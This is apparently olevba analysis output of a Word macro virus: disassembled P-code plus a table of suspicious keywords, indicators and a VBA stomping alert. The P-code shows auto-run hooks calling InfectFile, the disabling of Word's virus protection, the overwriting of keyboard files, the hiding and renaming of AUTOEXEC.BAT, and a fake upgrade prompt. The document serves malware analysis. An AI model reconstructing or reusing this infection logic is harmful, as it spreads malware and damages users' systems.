' Line #503:
' 	LitStr 0x001B "c:\windows\system\kbdus.kbd"
' 	Ld f1 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #504:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x018E 
' 	LitDI2 0x0004 
' 	ForStep 
' Line #505:
' 	Ld i 
' 	LitDI2 0x0004 
' 	IDiv 
' 	Paren 
' 	ArgsLd kb 0x0001 
' 	St l 
' Line #506:
' 	Ld f1 
' 	Sharp 
' 	Ld i 
' 	Ld l 
' 	PutRec 
' Line #507:
' 	StartForVariable 
' 	Next 
' Line #508:
' 	Ld f1 
' 	Sharp 
' 	Close 0x0001 
' Line #509:
' Line #510:
' 	ArgsLd Friend 0x0000 
' 	St f1 
' Line #511:
' 	LitStr 0x001C "c:\windows\system\kbdusx.kbd"
' 	Ld vball 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x000A "kbdusx.kbd"
' 	Eq 
' 	IfBlock 
' Line #512:
' 	LitStr 0x001C "c:\windows\system\kbdusx.kbd"
' 	Ld vbNormal 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #513:
' 	EndIfBlock 
' Line #514:
' Line #515:
' 	LitStr 0x001C "c:\windows\system\kbdusx.kbd"
' 	Ld f1 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #516:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x018E 
' 	LitDI2 0x0004 
' 	ForStep 
' Line #517:
' 	Ld i 
' 	LitDI2 0x0004 
' 	IDiv 
' 	Paren 
' 	ArgsLd kb 0x0001 
' 	St l 
' Line #518:
' 	Ld f1 
' 	Sharp 
' 	Ld i 
' 	Ld l 
' 	PutRec 
' Line #519:
' 	StartForVariable 
' 	Next 
' Line #520:
' 	Ld f1 
' 	Sharp 
' 	Close 0x0001 
' Line #521:
' 	EndIfBlock 
' Line #522:
' 	EndSub 
' Line #523:
' Line #524:
' Line #525:
' 	FuncDefn (Sub AutoOpen())
' Line #526:
' 	OnError (Resume Next) 
' Line #527:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #528:
' Line #529:
' 	LitVarSpecial (False)
' 	St otherV 
' Line #530:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #531:
' 	Ld ndxMac 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	St itemName 
' Line #532:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld itemName 
' 	Ld MyName 
' 	Ne 
' 	Ld itemName 
' 	Ld TD 
' 	Ne 
' 	And 
' 	Ld itemName 
' 	Ld RTNorm 
' 	Ne 
' 	And 
' 	Ld itemName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #533:
' 	QuoteRem 0x0008 0x0017 "-----------------------"
' Line #534:
' 	Ld itemName 
' 	St otherVName 
' Line #535:
' 	LitVarSpecial (True)
' 	St otherV 
' Line #536:
' 	GoTo OthersFound 
' Line #537:
' 	EndIfBlock 
' Line #538:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	NextVar 
' Line #539:
' Line #540:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #541:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #542:
' 	Ld ndxMac 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	St itemName 
' Line #543:
' 	LineCont 0x0004 09 00 10 00
' 	Ld itemName 
' 	Ld MyName 
' 	Ne 
' 	Ld itemName 
' 	Ld TD 
' 	Ne 
' 	And 
' 	Ld itemName 
' 	Ld RTNorm 
' 	Ne 
' 	And 
' 	Ld itemName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #544:
' 	QuoteRem 0x000C 0x0017 "-----------------------"
' Line #545:
' 	Ld itemName 
' 	St otherVName 
' Line #546:
' 	LitVarSpecial (True)
' 	St otherV 
' Line #547:
' 	GoTo OthersFound 
' Line #548:
' 	EndIfBlock 
' Line #549:
' 	StartForVariable 
' 	Ld ndxMac 
' 	EndForVariable 
' 	NextVar 
' Line #550:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	NextVar 
' Line #551:
' Line #552:
' 	Label OthersFound 
' Line #553:
' Line #554:
' 	Ld otherV 
' 	Not 
' 	IfBlock 
' Line #555:
' 	OnError (Resume Next) 
' Line #556:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #557:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #558:
' 	ArgsCall (Call) ChangeSomething 0x0000 
' Line #559:
' 	ElseBlock 
' Line #560:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld MyName 
' 	ParamNamed New 
' 	Ld otherVName 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #561:
' 	EndIfBlock 
' Line #562:
' 	EndSub 
' Line #563:
' Line #564:
' 	FuncDefn (Sub DoSome())
' Line #565:
' 	OnError (Resume Next) 
' Line #566:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x000C "autoexec.bat"
' 	Eq 
' 	IfBlock 
' Line #567:
' 	LitStr 0x000F "c:\msconfig.sys"
' 	Ld vbNormal 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #568:
' 	LitStr 0x000F "c:\msconfig.sys"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #569:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Ld vbNormal 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #570:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitStr 0x000F "C:\MSCONFIG.SYS"
' 	Name 
' Line #571:
' 	LitStr 0x000F "C:\MSCONFIG.SYS"
' 	Ld vbSystem 
' 	Ld vbReadOnly 
' 	Add 
' 	Ld vbHidden 
' 	Add 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #572:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #573:
' 	EndIfBlock 
' Line #574:
' 	EndSub 
' Line #575:
' Line #576:
' 	FuncDefn (Sub AutoExec())
' Line #577:
' 	OnError (Resume Next) 
' Line #578:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #579:
' 	ArgsCall (Call) ChangeSomething 0x0000 
' Line #580:
' 	ArgsCall (Call) DoSome 0x0000 
' Line #581:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #582:
' 	EndSub 
' Line #583:
' Line #584:
' 	FuncDefn (Sub AutoClose())
' Line #585:
' 	OnError (Resume Next) 
' Line #586:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #587:
' 	EndSub 
' Line #588:
' Line #589:
' 	FuncDefn (Sub AutoNew())
' Line #590:
' 	OnError (Resume Next) 
' Line #591:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #592:
' 	EndSub 
' Line #593:
' Line #594:
' 	FuncDefn (Sub AutoExit())
' Line #595:
' 	OnError (Resume Next) 
' Line #596:
' 	ArgsCall (Call) InfectFile 0x0000 
' Line #597:
' 	EndSub 
' Line #598:
' Line #599:
' Line #600:
' 	FuncDefn (Sub FileTemplates())
' Line #601:
' 	OnError (Resume Next) 
' Line #602:
' 	LitStr 0x0009 "Templates"
' 	Paren 
' 	ArgsCall msg 0x0001 
' Line #603:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #604:
' 	EndSub 
' Line #605:
' Line #606:
' 	FuncDefn (Sub msg(s As String))
' Line #607:
' 	LitStr 0x000E "The utilities "
' 	Ld s 
' 	Concat 
' 	LitStr 0x0076 "is not available at the standard edition of Microsoft Word, contact Microsoft for upgrade (cost of upgrade is minimal)"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000D "Not available"
' 	ArgsCall (Call) MsgBox 0x0003 
' Line #608:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |main.cpl            |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Hex String|!F09D               |2146303944                                   |
|Hex String|!F3gR               |2146336752                                   |
|Hex String|PF)v                |50462976                                     |
|Hex String|UWS$                |55575324                                     |
|Hex String|b1%(                |62312528                                     |
|Hex String|b1%1                |62312531                                     |
|Hex String|wFU1                |77465531                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

